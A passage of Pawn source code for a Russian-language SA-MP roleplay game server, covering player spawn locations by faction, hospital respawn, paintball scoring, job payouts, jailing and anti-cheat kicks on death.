		SetPlayerSkin(playerid, PI[playerid][P_PB_TEAM] == 0 ? 285 : 144);

		GivePlayerWeapon(playerid, 30, 600);
		GivePlayerWeapon(playerid, 25, 600);
		GivePlayerWeapon(playerid, 24, 600);

		SetPlayerHealth(playerid, 100.0);
		SetPlayerArmour(playerid, 0.0);

		new r = random(2);
		SetPlayerPos(playerid, paintball_spawn[g_paintball_info[PB_MAP]][PI[playerid][P_PB_TEAM]][r][0], paintball_spawn[g_paintball_info[PB_MAP]][PI[playerid][P_PB_TEAM]][r][1], paintball_spawn[g_paintball_info[PB_MAP]][PI[playerid][P_PB_TEAM]][r][2]);
		SetPlayerFacingAngle(playerid, paintball_spawn[g_paintball_info[PB_MAP]][PI[playerid][P_PB_TEAM]][r][0]);

		SetPlayerInterior(playerid, 1);
		SetPlayerVirtualWorld(playerid, 1);
	}
	else if(PlayerDied[playerid] == true)
	{
	    InHospital[playerid] = true;
	    SetHealth(playerid, 10+random(40));
	    SetPlayerFacingAngle(playerid, 270);
	    switch(PI[playerid][pCity])
	    {
	        case 1:
			{
			    SetPlayerVirtualWorld(playerid,4);
			    SetPlayerInterior(playerid,6);
			}
	        case 2:
	        {
	            SetPlayerVirtualWorld(playerid,4);
	            SetPlayerInterior(playerid,6);
	        }
	        default:
	        {
	            SetPlayerVirtualWorld(playerid,4);
	            SetPlayerInterior(playerid,6);
	        }
	    }
	    FreezePlayer(playerid, 5000);
		new Random = random(sizeof(MedicSpawn));
        SetPlayerPos(playerid, MedicSpawn[Random][0], MedicSpawn[Random][1], MedicSpawn[Random][2]);
        SendClientMessage(playerid,C_OSNOV,"Вам придется пройти курс лечения или вылечиться у медика. Войдите в палату и делайте процедуру.");
	}
	else if(PI[playerid][P_REALTOR_TYPE] != REALTOR_TYPE_NONE)
	{
		SetPlayerPos(playerid, 1060.7051,1920.9979,3026.7639);
		SetPlayerFacingAngle(playerid, 180.0);

		new index = GetPVarInt(playerid, "PlayerBizz");

		SetPlayerInterior(playerid, BizzInfo[index][bInt]);
		SetPlayerVirtualWorld(playerid, BizzInfo[index][bVirtual]);

		PI[playerid][P_REALTOR_TYPE] = REALTOR_TYPE_NONE;
	}
	else if(PI[playerid][P_ENTRANCE] != -1 && PI[playerid][P_ROOM] != -1 && PI[playerid][pSpawnChange] == 3)
	{
	    SetPlayerPosInRoom(playerid, PI[playerid][P_ENTRANCE], PI[playerid][P_ROOM]);
	}

	else if(PI[playerid][P_FAMILY] != 0 && PI[playerid][pSpawnChange] == 4 && GetFamilyData(PI[playerid][P_FAMILY]-1, F_SPAWN) == true && GetFamilyData(PI[playerid][P_FAMILY]-1, F_HOUSE) != -1)
	{
	    new i = GetFamilyData(PI[playerid][P_FAMILY]-1, F_HOUSE);
	    FreezePlayer(playerid, 5000);
		SetPlayerPos(playerid, HouseInfo[i][hExitx],HouseInfo[i][hExity], HouseInfo[i][hExitz]);
		SetPlayerInterior(playerid, HouseInfo[i][hInt]);
		SetPlayerVirtualWorld(playerid, HouseInfo[i][hVirtual]);
		SetPVarInt(playerid, "PlayerHouse", i);
	}
    else if(GetPlayerHouse(playerid) && PI[playerid][pSpawnChange] == 1)
	{
	    new i = GetPVarInt(playerid, "PlayerHouse");
	    FreezePlayer(playerid, 5000);
		SetPlayerPos(playerid, HouseInfo[i][hExitx],HouseInfo[i][hExity], HouseInfo[i][hExitz]);
		SetPlayerInterior(playerid, HouseInfo[i][hInt]);
		SetPlayerVirtualWorld(playerid, HouseInfo[i][hVirtual]);
	}
	else if(PI[playerid][pMember] == TEAM_MERIA && PI[playerid][pSpawnChange] == 2)
	{
        FreezePlayer(playerid, 5000);
		SetPlayerPos(playerid, -897.3243,836.0576,2512.9500);
		SetPlayerFacingAngle(playerid, 90.0);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(PI[playerid][pMember] == TEAM_VDV && PI[playerid][pSpawnChange] == 2)
	{
        FreezePlayer(playerid, 5000);
		SetPlayerPos(playerid, 355.0304,184.7031,1008.3793);
		SetPlayerFacingAngle(playerid, 180.8081);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid, 3);
		SetPlayerVirtualWorld(playerid, 2);
	}
	else if(PI[playerid][pMember] == TEAM_PRAVO && PI[playerid][pSpawnChange] == 2)
	{
        FreezePlayer(playerid, 5000);
		SetPlayerPos(playerid, 355.0304,184.7031,1008.3793);
		SetPlayerFacingAngle(playerid, 180.8081);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid, 3);
		SetPlayerVirtualWorld(playerid, 3);
	}
	else if(PI[playerid][pMember] == TEAM_POLICIA && PI[playerid][pSpawnChange] == 2)
	{
        FreezePlayer(playerid, 5000);
		SetPlayerInterior(playerid, 0);
	    SetPlayerPos(playerid, 598.4431,8.9766,1022.9027);
	    SetPlayerFacingAngle(playerid, 240.3255);
	    SetCameraBehindPlayer(playerid);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	else if(PI[playerid][pMember] == TEAM_POLICIA2 && PI[playerid][pSpawnChange] == 2)
	{
        FreezePlayer(playerid, 5000);
		SetPlayerInterior(playerid, 0);
	    SetPlayerPos(playerid, 449.3255,-81.2416,3002.0000);
	    SetPlayerFacingAngle(playerid, 177.3684);
	    SetCameraBehindPlayer(playerid);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	else if(PI[playerid][pMember] == TEAM_BOLNICA && PI[playerid][pSpawnChange] == 2)
	{
        FreezePlayer(playerid, 5000);
		SetPlayerPos(playerid, 1188.7313,-614.0790,1001.7578);
		SetPlayerFacingAngle(playerid, 183.0508);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid, 6);
		SetPlayerVirtualWorld(playerid, 4);
		InHospital[playerid] = true;
	}
	else if(PI[playerid][pMember] == TEAM_AUTOSCHOOL && PI[playerid][pSpawnChange] == 2)
	{
        FreezePlayer(playerid, 5000);
		SetPlayerPos(playerid, 133.9074,1378.0414,1002.9600);
		SetPlayerFacingAngle(playerid, 270.3437);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(PI[playerid][pMember] == TEAM_GROOVE && PI[playerid][pSpawnChange] == 2)
	{
        FreezePlayer(playerid, 5000);
		SetPlayerPos(playerid, 2559.6052,-1842.3524,2522.8401);
		SetPlayerFacingAngle(playerid, 180.4333);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid, 1);
	    SetPlayerVirtualWorld(playerid, 1);
	}
	else if(PI[playerid][pMember] == TEAM_FBI && PI[playerid][pSpawnChange] == 2)
	{
        FreezePlayer(playerid, 5000);
		SetPlayerPos(playerid, -2465.2659,-2316.4248,1002.0000);
		SetPlayerFacingAngle(playerid, 228.3354);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid, 0);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	else if(PI[playerid][pMember] == TEAM_BALLAS && PI[playerid][pSpawnChange] == 2)
	{
        FreezePlayer(playerid, 5000);
		SetPlayerPos(playerid, -2634.1008,2914.1060,2738.6201);
		SetPlayerFacingAngle(playerid, 270.0);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid, 1);
	    SetPlayerVirtualWorld(playerid, 1);
	}
	else if(PI[playerid][pMember] == TEAM_ARMIYA && PI[playerid][pSpawnChange] == 2) //Спавн
	{
        FreezePlayer(playerid, 5000);
	    SetPlayerPos(playerid, 1845.9569,1607.3256,1021.7215);
		SetPlayerFacingAngle(playerid, 260.9382);
		SetCameraBehindPlayer(playerid);
	    SetPlayerInterior(playerid, 0);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	else if(PI[playerid][pMember] == TEAM_SWAT && PI[playerid][pSpawnChange] == 2)
	{
        FreezePlayer(playerid, 5000);
	    SetPlayerPos(playerid, 2557.9214,2370.1150,2337.4524);
		SetPlayerFacingAngle(playerid, 270.0);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid, 1);
		SetPlayerVirtualWorld(playerid, 1);
	}
	else if(PI[playerid][pMember] == TEAM_OPG1 && PI[playerid][pSpawnChange] == 2)
	{
        FreezePlayer(playerid, 5000);
		SetPlayerPos(playerid, 463.0637,-339.3135,1016.4385);
		SetPlayerFacingAngle(playerid, 180.0);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid, 1);
		SetPlayerVirtualWorld(playerid, 1);
	}
	else if(PI[playerid][pMember] == TEAM_RSM && PI[playerid][pSpawnChange] == 2)
	{
        FreezePlayer(playerid, 5000);
		SetPlayerPos(playerid, 612.8551,-1.9367,1174.4821);
		SetPlayerFacingAngle(playerid, 270.0);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid, 1);
		SetPlayerVirtualWorld(playerid, 1);
	}
	else if(PI[playerid][pMember] == TEAM_SMI && PI[playerid][pSpawnChange] == 2)
	{
        FreezePlayer(playerid, 5000);
		SetPlayerPos(playerid, 248.0485,-186.9730,3003.3940);
		SetPlayerFacingAngle(playerid, 355.8874);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid, 1);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(PI[playerid][pMember] == TEAM_SWAT && PI[playerid][pSpawnChange] == 2)
	{
        FreezePlayer(playerid, 5000);
		SetPlayerPos(playerid, -232.6030,698.9533,1002.0000);
		SetPlayerFacingAngle(playerid, 270.0);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid, 1);
		SetPlayerVirtualWorld(playerid, 1);
	}
	else if(GetPlayerHouse(playerid) == 0 && PI[playerid][pSpawnChange] == 1)
	{
		FreezePlayer(playerid, 5000);
		SetPlayerPos(playerid, 1833.6774,2035.4652,16.0600);
		SetPlayerFacingAngle(playerid, 0.0);

		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(PI[playerid][pMember] >= 1 && PI[playerid][pSpawnChange] == 0 || PI[playerid][pMember] == 0)
	{
		new Random = random(sizeof(CORDSpawn));

        FreezePlayer(playerid, 1000);
		SetPlayerPos(playerid, CORDSpawn[Random][0], CORDSpawn[Random][1], CORDSpawn[Random][2]);

		SetPlayerFacingAngle(playerid, CORDSpawn[Random][3]);

		SetCameraBehindPlayer(playerid);

		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
	}
	rodEnable{playerid} = 0;
    rodRaised{playerid} = 0;
	ApplyAnimation(playerid, "PED", "null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid, "CARRY", "null",0.0,0,0,0,0,0);
	PlayerSpawned[playerid] = true;

	if(PI[playerid][pDeActivate] != 0)
	{
	    SendClientMessage(playerid, C_RED, "К сожалению Ваш аккаунт был деактивирован администратором сервера");
	    SendClientMessage(playerid, C_RED, "Доступ к аккаунту запрещен. Ожидайте, возможно скоро с Вас снимут это ограничение");
	    SendClientMessage(playerid, C_RED, "Если Вы считаете, что произошла ошибка - обратитесь к администратору сервера");
	    KickEx(playerid, "Deactivate");
	    return true;
	}

/*	{
	    new google[712];
		SendClientMessage(playerid, COLOR_LIME, "Вы вошли как администратор. Для авторизации, введите ({FFCC00}/alogin{FFFFFF})");
		strcat(google, "{FFFFFF}Вы являетесь администратором на сервере, а это значит, что Вам необходимо пройти доп. проверку аккаунта\n");
        strcat(google, "В качестве проверки будет выступать популярный сервис — {FC9B2D}Google Authenticator{FFFFFF}. Проверка не займет у Вас много времени. \n");
        strcat(google, "Все, что Вам необходимо, это установить на свой смартфон приложение — {139BF6}Google Authenticator {FFFFFF}в Play Market`e, или AppStore\n\n");
        strcat(google, "Если Вы готовы пройти проверку, нажмите 'Далее' и следуйте инструкции\n");
        strcat(google, "Если Вы отказываетесь от проверки, нажмите 'Отмена' или клавишу 'ESC'. При этом действии Вы будете кикнуты с сервера!");
        ShowPlayerDialog(playerid, DIALOG_GOOGLE, DIALOG_STYLE_MSGBOX, "Google Authenticator", google, "Далее", "Отмена");
	}*/

	//if(ClothesRound[playerid] != 1 || ClothesRound[playerid] != 2) CancelSelectTextDraw(playerid);


	new Year, Month, Day, Hour, Minute, Second;
	getdate(Year, Month, Day);
	gettime(Hour, Minute, Second);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET datavhod='%d-%02d-%02d %02d:%02d:%02d' WHERE name='%s'", Year, Month, Day, Hour, Minute, Second, GetName(playerid));
	mysql_query(dbHandle, STRING_GLOBAL);

	FreezePlayer(playerid, 6000);

    SetPVarInt(playerid,"Anti_AirFly",gettime()+5);

	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
	if(g_capture[C_STATUS] && killerid != INVALID_PLAYER_ID)
	{
		if(IsAMafia(playerid) && IsAMafia(killerid))
		{
			if(IsPlayerInDynamicArea(playerid, CaptureArea) && IsPlayerInDynamicArea(killerid, CaptureArea))
			{
				if(PI[playerid][pMember] == g_capture[C_TEAM_ATTACK] && PI[killerid][pMember] == g_capture[C_TEAM_PROTECT])
				{
					g_capture[C_TEAM_PROTECT_KILLS] ++;
				}
				else if(PI[killerid][pMember] == g_capture[C_TEAM_ATTACK] && PI[playerid][pMember] == g_capture[C_TEAM_PROTECT])
				{
					g_capture[C_TEAM_ATTACK_KILLS] ++;
				}
			}
		}
	}

	if(playerid == killerid)
	{
		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[{00BFFF}A{828282}] %s[%d] кикнут за использование читов (SelfKill)", GetName(playerid), playerid);
		SendAdminMessage(C_OSNOV, STRING_GLOBAL);
		Kick(playerid);
	}

	if(g_paintball_info[PB_STATUS] == 2 && killerid != INVALID_PLAYER_ID)
	{
		if(PI[playerid][P_PB_TEAM] == PI[killerid][P_PB_TEAM]) return 1;

		if(PI[playerid][P_PB_TEAM] == 0 && PI[killerid][P_PB_TEAM] == 1)
		{
			GameTextForPlayer(killerid, "~w~Kills ~g~+1", 5000, 1);
			GameTextForPlayer(playerid, "~w~Deaths ~g~+1", 5000, 1);

			g_paintball_info[PB_TEAM_KILLS][1] ++;
			g_paintball_info[PB_TEAM_DEATHS][0] ++;

			PI[playerid][P_PB_DEATHS] ++;
			PI[killerid][P_PB_KILLS] ++;
		}
		if(PI[playerid][P_PB_TEAM] == 1 && PI[killerid][P_PB_TEAM] == 0)
		{
			GameTextForPlayer(killerid, "~w~Kills ~g~+1", 5000, 1);
			GameTextForPlayer(playerid, "~w~Deaths ~g~+1", 5000, 1);

			g_paintball_info[PB_TEAM_KILLS][0] ++;
			g_paintball_info[PB_TEAM_DEATHS][1] ++;

			PI[killerid][P_PB_DEATHS] ++;
			PI[playerid][P_PB_KILLS] ++;
		}

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%d", g_paintball_info[PB_TEAM_KILLS][0]);
		TextDrawSetString(paintball_td[8],STRING_GLOBAL);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%d", g_paintball_info[PB_TEAM_KILLS][1]);
		TextDrawSetString(paintball_td[9], STRING_GLOBAL);

		if(g_paintball_info[PB_TEAM_KILLS][0] >= 30 || g_paintball_info[PB_TEAM_KILLS][1] >= 30)
		{
			new winner = g_paintball_info[PB_TEAM_KILLS][0] >= 30 ? 0 : 1;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Уважаемые игроки! Матч по пейнтболлу завершен, победила команда %s", winner == 0 ? ("спецназа") : ("террористов"));
			SendClientMessageToAll(C_OSNOV, STRING_GLOBAL);

			SetTimerEx("StopPaintBall", 500, false, "dd", 1, playerid);
		}
	}
	if(PI[playerid][P_JOB] != JOB_NONE)
	{
		if(PI[playerid][P_JOB] == JOB_MINER)
		{
			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Рабочий день завершён. Вы добыли: {FF9900}%d кг {37c268}руды",pPressed[playerid]);
			SendClientMessage(playerid, C_CROM, STRING_GLOBAL);

			if(!doubling_donate)
			{
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Заработано {FF9900}%d {37c268}рублей.",pPressed[playerid]*4);
				SendClientMessage(playerid, C_CROM, STRING_GLOBAL);

				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%i RUB",pPressed[playerid]*4);
				GameTextForPlayer(playerid, STRING_GLOBAL, 5000, 1);

				GiveMoney(playerid, pPressed[playerid]*4, "Зарплата на шахте");
			}
			else
			{
			    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Заработано {FF9900}%d {37c268}рублей.",pPressed[playerid]*8);
				SendClientMessage(playerid, C_CROM, STRING_GLOBAL);

				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%i RUB",pPressed[playerid]*8);
				GameTextForPlayer(playerid, STRING_GLOBAL, 5000, 1);

				GiveMoney(playerid, pPressed[playerid]*8, "Зарплата на шахте");
			}

   			RemovePlayerAttachedObject(playerid,1);
		   	RemovePlayerAttachedObject(playerid,2);// забрали тачку
		   	RemovePlayerAttachedObject(playerid,3);// забрали тачку

			if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
			else SetPlayerSkin(playerid, PI[playerid][pModel]);

			DisablePlayerCheckpoint(playerid);
			PI[playerid][P_JOB] = JOB_NONE;
			pPressed[playerid] = 0;
			SetPVarInt(playerid, "relate", 0);
		}
		if(PI[playerid][P_JOB] == JOB_GRUZ_WOOD)
		{
			if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
				else SetPlayerSkin(playerid, PI[playerid][pModel]);

			DisablePlayerCheckpoint(playerid);
			PI[playerid][P_JOB] = JOB_NONE;
			pPressed[playerid] = 0;
			DeletePVar(playerid, "relate");

			if(IsPlayerAttachedObjectSlotUsed(playerid, 4))
				RemovePlayerAttachedObject(playerid, 4);

			if(!doubling_donate)
			{
			    new money = pPressed[playerid]*5;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр",money);
				SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
				GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

				GiveMoney(playerid, money, "Зарплата на грузчиках");
			}
			else
			{
			    new money = pPressed[playerid]*9;

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр",money);
				SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
				GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

				GiveMoney(playerid, money, "Зарплата на грузчиках");
			}

			if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
			else SetPlayerSkin(playerid, PI[playerid][pModel]);

		}
		if(PI[playerid][P_JOB] == JOB_LOGGER)
		{
			if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
				else SetPlayerSkin(playerid, PI[playerid][pModel]);

			DisablePlayerCheckpoint(playerid);
			PI[playerid][P_JOB] = JOB_NONE;
			pPressed[playerid] = 0;
			DeletePVar(playerid, "relate");

			if(IsPlayerAttachedObjectSlotUsed(playerid, 3))
				RemovePlayerAttachedObject(playerid, 3);

			if(IsPlayerAttachedObjectSlotUsed(playerid, 4))
				RemovePlayerAttachedObject(playerid, 4);

			if(!doubling_donate)
			{
	            new money = pPressed[playerid]*3;
				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр",money);
				SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
				GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

				GiveMoney(playerid, money, "Зарплата");
			}
			else
			{
	            new money = pPressed[playerid]*6;
				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр",money);
				SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
				GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

				GiveMoney(playerid, money, "Зарплата");
			}

			if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
			else SetPlayerSkin(playerid, PI[playerid][pModel]);
		}
		if(PI[playerid][P_JOB] == JOB_FARMER)
		{
			if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
				else SetPlayerSkin(playerid, PI[playerid][pModel]);

			DisablePlayerCheckpoint(playerid);
			PI[playerid][P_JOB] = 0;
			pPressed[playerid] = 0;
			DeletePVar(playerid, "relate");

			if(IsPlayerAttachedObjectSlotUsed(playerid, 2))
				RemovePlayerAttachedObject(playerid, 2);

			SendClientMessage(playerid, C_RED, "Вы ушли от места работы, Ваша зарплата аннулирована");
		}
	}

	if(PI[playerid][P_BUG] != 0)
	{
		if(killerid != INVALID_PLAYER_ID)
		{
			SendClientMessage(killerid, C_OSNOV, "Вы нейтрализовали преступника. Вам была выдана премия: 1000 рублей");
			GiveMoney(killerid, 1000, "Премия за нейтрализацию");
		}

		new Float: X, Float: Y, Float: Z;

		GetPlayerPos(playerid, X, Y, Z);

		bank_money_pickup = CreatePickup(1550, 23, X, Y, Z, -1);

		if(IsPlayerAttachedObjectSlotUsed(playerid,4)) RemovePlayerAttachedObject(playerid,4);

		PI[playerid][P_BUG] = 0;

		DisablePlayerRaceCheckpoint(playerid);

		DeletePVar(playerid, "CheckpointGoToBase");
	}

	if(noclipdata[playerid][cameramode] == CAMERA_MODE_FLY) CancelFlyMode(playerid);
    if(GetPVarInt(playerid, "DeathTime") > GetTickCount()) return SKick(playerid, 2179);
	else SetPVarInt(playerid, "DeathTime", GetTickCount()+230);

	STRING_GLOBAL[0] = EOS;
	PlayerEnterTime[playerid] += 221;
	ResetPlayerWeapons(playerid);
	if(GetPVarInt(playerid, "Animation"))
	{
	    DeletePVar(playerid, "Animation");
	    TextDrawHideForPlayer(playerid, AnimDraw);
	}
	PlayerMenuExit(playerid);
	DeletePVar(playerid,"car_spawn");
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
	PlayerSpawned[playerid] = false;
	if(IsPlayerAttachedObjectSlotUsed(playerid, 7)) RemovePlayerAttachedObject(playerid, 7);
    Air_Gettime(playerid,4);
	SetPVarInt(playerid,"K_Times",GetPVarInt(playerid,"K_Times") + 1);
	if(GetPVarInt(playerid,"K_Times") > 1) return SKick(playerid, 5244);
	if(UseGPS[playerid])
	{
    	DisablePlayerRaceCheckpoint(playerid);
    	UseGPS[playerid] = false;
    	for(new i; i < 3; i++) TextDrawHideForPlayer(playerid, gps_td);
	}
	if(pCuff[playerid][pCuffee] == playerid)
	{
		new id = playerid;
		new cuffer = pCuff[id][pCuffer];
		SetPlayerSpecialAction(id, SPECIAL_ACTION_NONE);
		RemovePlayerAttachedObject(id, 0);
		pCuff[id][pCuffer] = INVALID_PLAYER_ID;
		pCuff[id][pCuffee] = INVALID_PLAYER_ID;
		pCuff[cuffer][pCuffee] = INVALID_PLAYER_ID;
		pCuff[cuffer][pCuffer] = INVALID_PLAYER_ID;
		SendClientMessage(cuffer, COLOR_BLUE, "Арестованный умер");
	}
	if(INVALID_PLAYER_ID != killerid)
	{
		if(reason >= 1 && reason <= 46 && GetPlayerWeapon(killerid) != reason && PI[playerid][pLevel] <= 3) return SKick(playerid, 5255);
		if(reason == 38 && GetPlayerState(killerid) == PLAYER_STATE_PASSENGER) return SKick(playerid, 8881);
	}
 	if(PlayerUseMask[playerid])
	{
        PlayerUseMask[playerid] = false;
		KillTimer(MaskTimer[playerid]);
	}
	if(PI[playerid][pWanted] > 0)
	{
		if(killerid == INVALID_PLAYER_ID) return 1;
		if(!IsACop(killerid)) return 1;
		if(PI[killerid][pMember] == TEAM_POLICIA || PI[killerid][pMember] == TEAM_FBI)
		{
		    STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Вы посажены в камеру на %i секунд!", PI[playerid][pWanted]*600);
			SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);
			SetPlayerInterior(playerid, 0);
			SetPlayerPos(playerid, 585.3808,2785.6555,1253.9860);
			SetPlayerFacingAngle(playerid, 273.0160);
			FreezePlayer(playerid, 5000);
			PI[playerid][pJail] = 1;
			MysqlUpdatePlayerInt(playerid, "jail", PI[playerid][pJail]);
			MysqlUpdatePlayerInt(playerid, "jailtime", PI[playerid][pJailTime]);
		}
		PI[playerid][pJailTime] = PI[playerid][pWanted] * 600;
		SetPlayerColorEx(playerid, TeamColors[0]);
		SetHealth(playerid, 100);
		PI[playerid][pWanted] = 0;
		SetPlayerWantedLevel(playerid, 0);
		TogglePlayerControllable(playerid, 1);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, 80, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~JAILED: ~w~%d", PI[playerid][pJailTime]);
		GameTextForPlayer(playerid, STRING_GLOBAL, 3000, 3);
		MysqlUpdatePlayerInt(playerid, "jail", PI[playerid][pJail]);
		MysqlUpdatePlayerInt(playerid, "jailtime", PI[playerid][pJailTime]);
		MysqlUpdatePlayerInt(playerid, "wanted", PI[playerid][pWanted]);
	}
	if(GetPVarInt(playerid, "PriceBus") > 0)
	{
		DeletePVar(playerid, "BusTime");
		DeletePVar(playerid, "TypeBus");
		DeletePVar(playerid, "PriceBus");
		DeletePVar(playerid, "BusStop");
		DeletePVar(playerid, "BusMoney");
		PI[playerid][pBusTime] = 0;
		pPressed[playerid] = 0;
		if(IsValidDynamic3DTextLabel(BusText3D[playerid])) DestroyDynamic3DTextLabel(BusText3D[playerid]);
		new id = PI[playerid][BusCarID];
		SetVehiclePos(id, g_vehicle[id][veh_x], g_vehicle[id][veh_y], g_vehicle[id][veh_z]);
		SetVehicleZAngle(id, g_vehicle[id][veh_a]);
		SetVehicleHealth(id, 1000.0);
		PI[playerid][BusCarID] = INVALID_VEHICLE_ID;
		DisablePlayerRaceCheckpoint(playerid);
	}
	if(!PI[playerid][pAdmin])
	{
		if(!PI[playerid][pJailTime])
		{
		    if(IsPlayerToSquare(playerid,-891.3302,-2950.0190,2915.9917,560.3257)) PI[playerid][pCity] = 1;
			else if(IsPlayerToSquare(playerid,-2929.6589,-2889.1660,-1326.9077,1493.1770)) PI[playerid][pCity] = 2;
			else PI[playerid][pCity] = 3;

			MysqlUpdatePlayerInt(playerid, "city", PI[playerid][pCity]);

			PlayerDied[playerid] = true;
		}
	}
	SetHunger(playerid, 40);
	DisablePlayerCheckpoint(playerid);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 3)) RemovePlayerAttachedObject(playerid,3);
	new callerid = Mobile[playerid];
	if(callerid != -1)
	{
		SendClientMessage(callerid,  C_RED, "Связь оборвалась");
		CellTime[callerid] = -1;
		Mobile[callerid] = -1;
		Mobile[playerid] = -1;
		CellTime[playerid] = -1;
		DeletePVar(playerid, "CallTime");
		DeletePVar(callerid, "CallTime");
	}
	if(InShop[playerid] > 0 || GetPVarInt(playerid, "InShop") > 0)
	{
	    if(PI[playerid][SalonCarID] != INVALID_VEHICLE_ID) DestroyVehicle(PI[playerid][SalonCarID]);
		DeletePVar(playerid, "InShop");
		InShop[playerid] = 0;
		PI[playerid][SalonCarID] = INVALID_VEHICLE_ID;
		CancelSelectTextDraw(playerid);
	}
	if(GetPVarInt(playerid, "DrivingTest"))
	{
		DeletePVar(playerid, "DrivingTest");
		DeletePVar(playerid, "DrivingTestHealth");
		DeletePVar(playerid, "DrivingTestError");
		SendClientMessage(playerid, C_RED, "Вы провалили экзамен на управление наземным транспортом");
	}
	if(GetPVarInt(playerid, "FlyTest"))
	{
		DeletePVar(playerid, "FlyTest");
		DeletePVar(playerid, "FlyTestHealth");
		DeletePVar(playerid, "FlyTestError");
		SendClientMessage(playerid, C_RED, "Вы провалили экзамен на управление воздушным транспортом");
	}
	if(GetPVarInt(playerid, "WaterTest"))
	{
		DeletePVar(playerid, "WaterTest");
		DeletePVar(playerid, "WaterTestTimeOn");
		DeletePVar(playerid, "WaterTestHealth");
		DeletePVar(playerid, "WaterTestError");
		SendClientMessage(playerid, C_RED, "Вы провалили экзамен на управление водным транспортом");
	}
	if(killerid != INVALID_PLAYER_ID)
	{
		if(PI[playerid][pJail] == 0)
		{
		    if(!PI[killerid][pAdmin])
		    {
				if(IsACop(killerid) || IsAArmy(killerid) || IsAGang(killerid) || IsAMafia(killerid)) { }
				else
				{
					if(PI[playerid][P_PB_TEAM] != -1 || PI[killerid][P_PB_TEAM] != -1)
						return 1;

					if(PI[killerid][pWanted] >= 6) return 1;
					PI[killerid][pWanted] += 2;
					if(PI[killerid][pWanted] >= 6) PI[killerid][pWanted] = 6;
					PI[killerid][pWantedTime] = 1800 + random(300);
					SetPlayerWantedLevel(killerid,PI[killerid][pWanted]);

					STRING_GLOBAL[0] = EOS;
